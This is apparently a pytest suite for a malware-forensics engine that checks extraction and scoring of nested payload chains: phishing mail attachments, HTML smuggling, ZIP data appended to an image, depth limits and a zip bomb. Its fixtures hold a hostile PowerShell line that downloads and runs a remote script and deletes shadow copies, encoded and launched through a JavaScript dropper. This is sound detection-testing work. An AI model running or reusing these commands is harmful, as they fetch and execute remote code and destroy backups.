"""Payload-Kette (engines/payloads.py): extrahieren, rekursiv analysieren, Gefahr vererben."""
import base64
import io
import os
import zipfile
from email.message import EmailMessage

import pytest

from engines import run_forensic
from engines import payloads as pl
from engines.payloads import flatten

INNER = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/s3.ps1'); vssadmin delete shadows /all /quiet"
ENC = base64.b64encode(INNER.encode("utf-16-le")).decode()


def _zip(files):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in files.items():
            z.writestr(n, d)
    return buf.getvalue()


def _mail(tmp_path, attachment, name="Rechnung.zip"):
    m = EmailMessage()
    m["From"], m["To"], m["Subject"] = "billing@pay-portal.invalid", "opfer@firma.invalid", "Rechnung"
    m.set_content("Anbei.")
    m.add_attachment(attachment, maintype="application", subtype="octet-stream", filename=name)
    p = tmp_path / "mail.eml"
    p.write_bytes(bytes(m))
    return p


def test_mail_zip_js_encodedcommand_chain(tmp_path):
    js = f'new ActiveXObject("WScript.Shell").Run("powershell -w hidden -EncodedCommand {ENC}");'
    res = run_forensic(str(_mail(tmp_path, _zip({"Rechnung.js": js, "readme.txt": "hallo"}))))
    rows = [(d, n["name"], n["level"]) for d, n in flatten(res["payloads"])]
    assert rows[0][:2] == (1, "Rechnung.zip")
    assert (2, "Rechnung.js") in [(d, n) for d, n, _ in rows]
    assert (3, "encoded_command.ps1", "CRITICAL") in rows
    assert "readme.txt" not in [n for _, n, _ in rows]                 # uninteressant → nicht extrahiert
    assert res["score"]["level"] == "CRITICAL"
    assert "Rechnung.zip › Rechnung.js › encoded_command.ps1" in res["threat"]["headline"]
    ids = {t["id"] for t in res["attack"]["techniques"]}
    assert {"T1490", "T1105", "T1027.009"} <= ids                      # aus der tiefsten Stufe vererbt
    assert "_payload_findings" not in res


def test_benign_archive_stays_clean(tmp_path):
    p = tmp_path / "fotos.zip"
    p.write_bytes(_zip({"notiz.txt": "Einkauf", "bericht.html": "<html><body>Hallo</body></html>"}))
    res = run_forensic(str(p))
    assert [n["name"] for _, n in flatten(res["payloads"])] == ["bericht.html"]
    assert res["score"]["level"] in ("CLEAN", "LOW RISK")
    assert not [f for f in res["score"]["findings"] if f["code"].startswith("nested_payload")]


def test_html_smuggling_base64_zip(tmp_path):
    blob = base64.b64encode(_zip({"invoice.ps1": f"powershell -EncodedCommand {ENC}"})).decode()
    p = tmp_path / "smuggle.html"
    p.write_text(f'<script>var d="{blob}";var b=atob(d);</script>')
    res = run_forensic(str(p))
    names = [n["name"] for _, n in flatten(res["payloads"])]
    assert names[:2] == ["blob_1.zip", "invoice.ps1"] and "encoded_command.ps1" in names
    assert res["score"]["level"] == "CRITICAL"


def test_appended_payload_after_image(tmp_path):
    from PIL import Image
    p = tmp_path / "bild.jpg"
    Image.new("RGB", (32, 32), (10, 200, 30)).save(p, "JPEG")
    with open(p, "ab") as f:
        f.write(_zip({"x.ps1": f"powershell -EncodedCommand {ENC}"}) + os.urandom(1500))
    res = run_forensic(str(p))
    first = res["payloads"][0]
    assert first["source"] == "data after end of file" and first["name"].endswith(".zip")
    assert res["score"]["level"] == "CRITICAL"


def test_depth_and_budget_limits(tmp_path, monkeypatch):
    # 5-fach verschachteltes ZIP: nur MAX_DEPTH Ebenen werden geöffnet
    data = _zip({"core.ps1": f"powershell -EncodedCommand {ENC}"})
    for i in range(5):
        data = _zip({f"level{i}.zip": data})
    p = tmp_path / "deep.zip"
    p.write_bytes(data)
    res = run_forensic(str(p))
    assert max(d for d, _ in flatten(res["payloads"])) == pl.MAX_DEPTH
    monkeypatch.setattr(pl, "MAX_NODES", 1)
    many = tmp_path / "many.zip"
    many.write_bytes(_zip({f"s{i}.ps1": f"# {i}\nIEX 1" for i in range(5)}))
    res = run_forensic(str(many))
    assert len(res["payloads"]) == 1
    assert any(f["code"] == "payload_budget" for f in res["score"]["findings"])


def test_zipbomb_entry_is_not_inflated(tmp_path):
    p = tmp_path / "bomb.zip"
    with zipfile.ZipFile(p, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("payload.exe", b"\x00" * (40 << 20))          # > MAX_CHILD_BYTES
    res = run_forensic(str(p))
    assert res["payloads"] == []


def test_history_indexes_iocs_from_inner_stages(tmp_path):
    from core.history import HistoryDB
    db = HistoryDB(tmp_path / "h.db")
    js = f'new ActiveXObject("WScript.Shell").Run("powershell -EncodedCommand {ENC}");'
    aid = db.record(run_forensic(str(_mail(tmp_path, _zip({"a.js": js})))))
    # die IP steckt nur in der dekodierten, innersten Stufe
    assert [r["id"] for r in db.list_analyses(search="198.51.100.7")] == [aid]


def test_chain_tab_and_report(tmp_path):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    from gui.analysis_view import AnalysisView
    from core.report import file_report_html
    js = f'new ActiveXObject("WScript.Shell").Run("powershell -EncodedCommand {ENC}");'
    res = run_forensic(str(_mail(tmp_path, _zip({"a.js": js}))))
    v = AnalysisView()
    v.load_result(res)
    assert v.chain.count == 3 and "CHAIN  3" in v.tabs.tabText(v.tabs.indexOf(v.chain))
    html = file_report_html(res)
    assert "Payload chain" in html and "encoded_command.ps1" in html
